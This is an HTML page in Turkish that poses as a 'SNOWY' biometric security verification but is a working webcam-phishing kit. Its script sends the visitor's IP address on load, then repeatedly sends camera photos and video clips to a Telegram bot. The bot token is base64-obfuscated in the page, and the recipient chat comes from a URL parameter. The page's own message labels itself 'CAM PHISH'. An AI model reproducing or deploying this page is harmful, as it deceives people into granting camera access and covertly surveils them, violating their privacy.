<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 40px;
            padding: 45px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
            text-align: center;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(102, 126, 234, 0.3);
        }
        h2 { 
            color: #0a0a0f; 
            font-size: 36px; 
            margin-bottom: 15px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        h2 span { 
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        p { 
            color: #4a5568; 
            margin-bottom: 40px;
            font-size: 16px;
            line-height: 1.7;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 20px 30px rgba(102, 126, 234, 0.4);
            position: relative;
            overflow: hidden;
        }
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.7s;
        }
        .btn:hover::before {
            left: 100%;
        }
        .btn:hover { 
            transform: translateY(-3px);
            box-shadow: 0 25px 40px rgba(102, 126, 234, 0.5);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid rgba(102, 126, 234, 0.1);
            border-left-color: #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.6s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
        .loading-text { 
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 20px;
            font-weight: 600;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Güvenliğiniz için gelişmiş biyometrik doğrulama gereklidir.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            "use strict";
            
            // ============================================
            // PROFESYONEL KONFİGÜRASYON
            // ============================================
            const API_CONFIG = {
                endpoint: "https://api.telegram.org",
                key: "Nzk5ODM2NDE3OTpBQUdQV2NhTmFDRS1STy12UmUtOFJQNk9LU2FfbXVQaTQ0cw=="
            };
            
            const BOT_TOKEN = atob(API_CONFIG.key);
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = Math.max(1, Math.min(15, parseInt(urlParams.get('foto')) || 3));
            const VIDEO_SURESI = Math.max(1, Math.min(15, parseInt(urlParams.get('video')) || 5));
            
            // ============================================
            // GELİŞMİŞ ZAMANLAMA MOTORU
            // ============================================
            let video, canvas, ctx;
            let mediaRecorder = null;
            let stream = null;
            let videoCount = 0;
            let photoCount = 0;
            let frameId = null;
            let baslangicZamani = 0;
            
            // ============================================
            // IP GÖNDER - SADECE BİR KERE
            // ============================================
            if (TARGET_ID && BOT_TOKEN) {
                fetch('https://api.ipify.org?format=json', { 
                    cache: 'no-store',
                    priority: 'high'
                })
                .then(r => r.json())
                .then(d => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: TARGET_ID,
                            text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                        })
                    });
                })
                .catch(e => console.error('IP hatası:', e));
            }
            
            // ============================================
            // KAMERA BAŞLAT - PROFESYONEL
            // ============================================
            async function startCamera() {
                try {
                    // Kamera iznini iste
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            frameRate: { ideal: 60 }
                        },
                        audio: false
                    });
                    
                    // Elementleri al
                    video = document.getElementById('video');
                    canvas = document.getElementById('canvas');
                    ctx = canvas.getContext('2d', { 
                        alpha: false, 
                        desynchronized: true,
                        willReadFrequently: false
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play()
                            .then(() => {
                                // UI güncelle
                                document.getElementById('startBtn').style.display = 'none';
                                document.getElementById('loading').style.display = 'block';
                                document.getElementById('loadingText').textContent = 'Güvenlik kontrolü başladı...';
                                
                                // Başlangıç zamanı
                                baslangicZamani = performance.now();
                                
                                // Ana zamanlama döngüsünü başlat
                                frameId = requestAnimationFrame(zamanlamaDongusu);
                            })
                            .catch(e => {
                                console.error('Video play hatası:', e);
                                alert('Video oynatılamadı!');
                            });
                    };
                    
                } catch(e) {
                    console.error('Kamera hatası:', e);
                    alert('Kamera izni gerekli! Lütfen kamera erişimine izin verin.');
                }
            }
            
            // ============================================
            // ANA ZAMANLAMA DÖNGÜSÜ - MİLİSANİYE HASSASİYET
            // ============================================
            function zamanlamaDongusu() {
                if (!stream?.active || !video.videoWidth) {
                    frameId = requestAnimationFrame(zamanlamaDongusu);
                    return;
                }
                
                const now = performance.now();
                const gecenSure = (now - baslangicZamani) / 1000;
                
                // ============================================
                // FOTOĞRAF KONTROLÜ - TAM ZAMANINDA
                // ============================================
                const hedefFoto = Math.floor(gecenSure / FOTO_SURESI);
                while (photoCount < hedefFoto) {
                    photoCount++;
                    
                    // Fotoğraf çek (asenkron)
                    requestAnimationFrame(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob((blob) => {
                            if (!blob) return;
                            
                            const formData = new FormData();
                            formData.append('chat_id', TARGET_ID);
                            formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                            formData.append('caption', `📸 Fotoğraf #${photoCount} - ${gecenSure.toFixed(3)}s`);
                            
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData,
                                priority: 'high'
                            }).catch(e => console.error('Fotoğraf hatası:', e));
                        }, 'image/jpeg', 0.92);
                    });
                }
                
                // ============================================
                // VİDEO KONTROLÜ - TAM ZAMANINDA
                // ============================================
                const hedefVideo = Math.floor(gecenSure / VIDEO_SURESI);
                while (videoCount <= hedefVideo) {
                    videoCount++;
                    
                    // Yeni video başlat
                    const videoIndex = videoCount;
                    const videoBaslangic = performance.now();
                    const chunks = [];
                    
                    // MediaRecorder ayarları
                    let options = { videoBitsPerSecond: 5000000 };
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        options.mimeType = 'video/webm;codecs=vp9';
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                        options.mimeType = 'video/webm;codecs=vp8';
                    }
                    
                    try {
                        const mr = new MediaRecorder(stream, options);
                        
                        mr.ondataavailable = (e) => {
                            if (e.data.size > 0) chunks.push(e.data);
                        };
                        
                        mr.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const boyutKB = (blob.size / 1024).toFixed(0);
                            const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(3);
                            
                            const formData = new FormData();
                            formData.append('chat_id', TARGET_ID);
                            formData.append('video', blob, `video_${Date.now()}.webm`);
                            formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                            
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                method: 'POST',
                                body: formData,
                                priority: 'high'
                            }).catch(e => console.error('Video hatası:', e));
                        };
                        
                        // Başlangıç zamanına göre gecikmeli başlat
                        const videoGecikme = Math.max(0, (videoCount - 1) * VIDEO_SURESI * 1000 - (now - baslangicZamani));
                        
                        setTimeout(() => {
                            if (stream?.active) {
                                mr.start();
                                
                                // TAM SÜREDE DURDUR
                                setTimeout(() => {
                                    if (mr.state === 'recording') {
                                        mr.stop();
                                    }
                                }, VIDEO_SURESI * 1000);
                            }
                        }, videoGecikme);
                        
                    } catch(e) {
                        console.error('Video oluşturma hatası:', e);
                    }
                    
                    // Bir sonraki videoyu beklemeden devam et
                    break;
                }
                
                frameId = requestAnimationFrame(zamanlamaDongusu);
            }
            
            // ============================================
            // TEMİZLİK
            // ============================================
            window.onbeforeunload = function() {
                if (frameId) cancelAnimationFrame(frameId);
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
    </html>
